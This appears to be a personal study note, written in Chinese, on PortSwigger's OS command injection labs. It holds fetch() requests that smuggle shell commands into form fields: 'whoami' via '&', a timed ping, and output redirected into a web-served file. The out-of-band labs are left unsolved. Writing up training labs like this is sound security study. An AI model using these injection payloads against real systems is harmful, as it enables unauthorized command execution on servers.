---
title: OS command injection
description: OS command injection
last_update:
  date: "2025-08-29T08:00:00+08:00"
---

## 前言

這塊感覺是我很弱的一個領域，因為我其實對 OS command 沒有很熟悉

## Lab: OS command injection, simple case

| Dimension | Description                                                                     |
| --------- | ------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/os-command-injection#injecting-os-commands |
| Lab       | https://portswigger.net/web-security/os-command-injection/lab-simple            |

嘗試

```js
fetch(`${location.origin}/product/stock`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `productId=${encodeURIComponent(`1 & echo whoami &`)}&storeId=1`,
  method: "POST",
  credentials: "include",
});
```

結果

```
sh: 1: 1: not found
/home/peter-xjFXca/stockreport.sh: line 5: $2: unbound variable
```

## Useful Commands

https://portswigger.net/web-security/os-command-injection#useful-commands

## Lab: Blind OS command injection with time delays

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/os-command-injection#detecting-blind-os-command-injection-using-time-delays |
| Lab       | https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays                                  |

Submit Feedback 有四個欄位，一一嘗試，最後在 Email 欄位成功注入

```js
fetch(`${location.origin}/feedback/submit`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `csrf=Xy0bXtNRAf5VjmXzRbakwTedvYsJXjku&name=123&email=${encodeURIComponent(`& ping -c 10 127.0.0.1 &`)}&subject=123&message=123`,
  method: "POST",
  credentials: "include",
});
```

## Lab: Blind OS command injection with output redirection

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/os-command-injection#exploiting-blind-os-command-injection-by-redirecting-output |
| Lab       | https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection                                |

先嘗試

```js
fetch(`${location.origin}/feedback/submit`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `csrf=02NO2AVme1exgRgZnEWVTK9MruR7ZKmw&name=123&email=${encodeURIComponent(`& whoami > /var/www/images/whoami.txt &`)}&subject=123&message=123`,
  method: "POST",
  credentials: "include",
});
```

之後訪問 `/image?filename=whoami.txt`

## Lab: Blind OS command injection with out-of-band interaction

| Dimension | Description                                                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/os-command-injection#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques |
| Lab       | https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band                                                   |

<!-- todo-yus Burp Suite Pro -->

這題需要 Burp Suite Professional，之後再來解～

## Lab: Blind OS command injection with out-of-band data exfiltration

| Dimension | Description                                                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/os-command-injection#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques |
| Lab       | https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration                                 |

<!-- todo-yus Burp Suite Pro -->

這題需要 Burp Suite Professional，之後再來解～

## Ways of injecting OS commands

https://portswigger.net/web-security/os-command-injection#ways-of-injecting-os-commands

## 小結

Lab 題目超少，一下子就解完，只要跟 out-of-band 相關的題目，就要 Burp Suite Professional 才能解 QQ

## 參考資料

- https://portswigger.net/web-security/os-command-injection
